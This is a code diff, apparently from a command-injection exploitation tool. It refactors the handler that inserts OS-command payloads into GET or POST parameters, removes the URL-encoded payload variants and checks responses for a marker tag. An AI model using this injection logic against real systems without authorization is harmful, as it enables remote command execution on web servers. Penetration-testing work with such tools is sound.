@@ -114,10 +114,6 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
 	  combination = prefix + seperator
 	  if combination in settings.JUNK_COMBINATION:
 	    prefix = ""
-	  
-	  # Encode (urlencode) prefixes and suffixes
-	  encoded_prefix = urllib.quote_plus(prefix)
-	  encoded_suffix = urllib.quote_plus(suffix)
 
 	  # Change TAG on every request to prevent false-positive resutls.
 	  TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))  
@@ -142,7 +138,6 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
 	      payload = prefix + payload
 	      
 	    else:
-	      encoded_payload = encoded_prefix + payload
 	      payload = prefix + payload
 	      
 	    # Check if defined "--suffix" option.
@@ -151,99 +146,87 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
 	      payload = payload + suffix
 	      
 	    else:
-	      encoded_payload = encoded_payload + encoded_suffix
 	      payload = payload + suffix
 
-	    payload_list = []
-	    if payload != encoded_payload:
-	      payload_list.append(payload)
-	      payload_list.append(encoded_payload)
+	    if seperator == " " :
+	      payload = re.sub(" ", "%20", payload)
 	    else:
-	      payload_list.append(payload)
+	      payload = re.sub(" ", whitespace, payload)
+
+	    #Check if defined "--verbose" option.
+	    if menu.options.verbose:
+	      sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
 	    
-	    for payload in payload_list :
-	      if urllib.unquote(payload) == payload:
-		is_encoded = True
-
-	      if seperator == " " :
-		payload = re.sub(" ", "%20", payload)
-	      else:
-		payload = re.sub(" ", whitespace, payload)
-
-	      #Check if defined "--verbose" option.
-	      if menu.options.verbose:
-		sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
+	    # Check if defined method is GET (Default).
+	    if http_request_method == "GET":
 	      
-	      # Check if defined method is GET (Default).
-	      if http_request_method == "GET":
-		
-		# Check if its not specified the 'INJECT_HERE' tag
-		url = parameters.do_GET_check(url)
-		
-		# Define the vulnerable parameter
-		vuln_parameter = parameters.vuln_GET_param(url)
+	      # Check if its not specified the 'INJECT_HERE' tag
+	      url = parameters.do_GET_check(url)
+	      
+	      # Define the vulnerable parameter
+	      vuln_parameter = parameters.vuln_GET_param(url)
 
-		target = re.sub(settings.INJECT_TAG, payload, url)
-		request = urllib2.Request(target)
+	      target = re.sub(settings.INJECT_TAG, payload, url)
+	      request = urllib2.Request(target)
 
-		# Check if defined extra headers.
-		headers.do_check(request)
+	      # Check if defined extra headers.
+	      headers.do_check(request)
 
-		# Check if defined any HTTP Proxy.
-		if menu.options.proxy:
-		  try:
-		    proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
-		    opener = urllib2.build_opener(proxy)
-		    urllib2.install_opener(opener)
-		    response = urllib2.urlopen(request)
-		    
-		  except urllib2.HTTPError, err:
-		    print "\n(x) Error : " + str(err)
-		    sys.exit(1) 
-	    
-		else:
+	      # Check if defined any HTTP Proxy.
+	      if menu.options.proxy:
+		try:
+		  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
+		  opener = urllib2.build_opener(proxy)
+		  urllib2.install_opener(opener)
 		  response = urllib2.urlopen(request)
 		  
-	      # Check if defined method is POST.
+		except urllib2.HTTPError, err:
+		  print "\n(x) Error : " + str(err)
+		  sys.exit(1) 
+	  
 	      else:
-		parameter = menu.options.data
-		parameter = urllib2.unquote(parameter)
+		response = urllib2.urlopen(request)
 		
-		# Check if its not specified the 'INJECT_HERE' tag
-		parameter = parameters.do_POST_check(parameter)
-		
-		# Define the POST data
-		data = re.sub(settings.INJECT_TAG, payload, parameter)
-		request = urllib2.Request(url, data)
-		
-		# Define the vulnerable parameter
-		vuln_parameter = parameters.vuln_POST_param(parameter,url)
-		
-		# Check if defined extra headers.
-		headers.do_check(request)
+	    # Check if defined method is POST.
+	    else:
+	      parameter = menu.options.data
+	      parameter = urllib2.unquote(parameter)
+	      
+	      # Check if its not specified the 'INJECT_HERE' tag
+	      parameter = parameters.do_POST_check(parameter)
+	      
+	      # Define the POST data
+	      data = re.sub(settings.INJECT_TAG, payload, parameter)
+	      request = urllib2.Request(url, data)
+	      
+	      # Define the vulnerable parameter
+	      vuln_parameter = parameters.vuln_POST_param(parameter,url)
+	      
+	      # Check if defined extra headers.
+	      headers.do_check(request)
 
-		# Check if defined any HTTP Proxy.
-		if menu.options.proxy:
-		  try:
-		    proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
-		    opener = urllib2.build_opener(proxy)
-		    urllib2.install_opener(opener)
-		    response = urllib2.urlopen(request)
-				  
-		  except urllib2.HTTPError, err:
-		    print "\n(x) Error : " + str(err)
-		    sys.exit(1) 
-	    
-		else:
+	      # Check if defined any HTTP Proxy.
+	      if menu.options.proxy:
+		try:
+		  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
+		  opener = urllib2.build_opener(proxy)
+		  urllib2.install_opener(opener)
 		  response = urllib2.urlopen(request)
-		    
-	      # if need page reload
-	      if menu.options.url_reload: 
-		time.sleep(delay)
-		response = urllib.urlopen(url)
-		
-	      html_data = response.read()
-	      shell = re.findall(r""+TAG+TAG+TAG+"", html_data)
+				
+		except urllib2.HTTPError, err:
+		  print "\n(x) Error : " + str(err)
+		  sys.exit(1) 
+	  
+	      else:
+		response = urllib2.urlopen(request)
+		  
+	    # if need page reload
+	    if menu.options.url_reload: 
+	      time.sleep(delay)
+	      response = urllib.urlopen(url)
+	      
+	    html_data = response.read()
+	    shell = re.findall(r""+TAG+TAG+TAG+"", html_data)
 	    
 	  except:
 	    continue
@@ -327,20 +310,14 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
 		      prefix = menu.options.prefix
 		      payload = prefix + payload
 		    else:
-		      if is_encoded == True:
-			payload = encoded_prefix + payload
-		      else:
-			payload = prefix + payload
+		      payload = prefix + payload
 		      
 		    # Check if defined "--suffix" option.
 		    if menu.options.suffix:
 		      suffix = menu.options.suffix
 		      payload = payload + suffix
 		    else:
-		      if is_encoded == True:
-			payload = payload + encoded_suffix
-		      else:
-			payload = payload + suffix
+		      payload = payload + suffix
 			
 		    # Check if defined "--verbose" option.
 		    if menu.options.verbose:
@@ -445,4 +422,4 @@ def exploitation(url,delay,filename,http_request_method):
     
   else:
     classic_exploitation_handler(url,delay,filename,http_request_method)
-    
+
